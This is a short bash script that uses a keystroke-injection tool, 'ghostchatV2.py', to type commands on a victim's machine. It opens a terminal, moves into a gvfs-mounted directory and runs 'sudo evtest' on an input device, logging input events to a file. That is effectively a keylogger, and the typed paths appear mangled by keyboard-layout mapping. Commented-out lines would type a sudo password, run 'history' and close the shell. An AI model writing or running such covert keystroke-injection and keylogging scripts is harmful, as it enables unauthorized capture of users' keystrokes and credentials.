#!/bin/bash

# Automated input sequence script using ghostchatV2.py
# This script uses the Python ghostchat script to send all keyboard inputs

# Check if ghostchatV2.py exists
if [ ! -f "ghostchatV2.py" ]; then
    echo "ghostchatV2.py not found in current directory!"
    exit 1
fi

echo "Starting automated input sequence using ghostchatV2.py..."

# Send Ctrl+Alt+T (open terminal)
python3 ghostchatV2.py -combo "Ctrl+Alt+T"

# Press Enter
python3 ghostchatV2.py -k "enter"

# Navigate to directory
python3 ghostchatV2.py --string "cd >run>user>"
python3 ghostchatV2.py -k "tab"

python3 ghostchatV2.py --string "gvfs>"
python3 ghostchatV2.py -k "tab"

python3 ghostchatV2.py --string "te;p>VV"
python3 ghostchatV2.py -k "enter"

# Run evtest command
python3 ghostchatV2.py --string "sudo evtest >dev>input>event# "
python3 ghostchatV2.py -combo "Shift+left"
python3 ghostchatV2.py --string " log<txt 1"
python3 ghostchatV2.py -k "enter"
python3 ghostchatV2.py -combo "Alt+f4"

#sleep 1
# Enter password
#python3 ghostchatV2.py --string ":otdePqsse"
#python3 ghostchatV2.py -k "etoile"
#python3 ghostchatV2.py -k "etoile"
#python3 ghostchatV2.py -combo "Shift+deux"
#python3 ghostchatV2.py --string "!"
#python3 ghostchatV2.py -k "enter"

# Run history command
#python3 ghostchatV2.py --string "history 6c"
#python3 ghostchatV2.py -k "enter"

# Send Ctrl+D
#python3 ghostchatV2.py -combo "Ctrl+d"
#python3 ghostchatV2.py -combo "Ctrl+d"

echo "All commands sent via ghostchatV2.py!"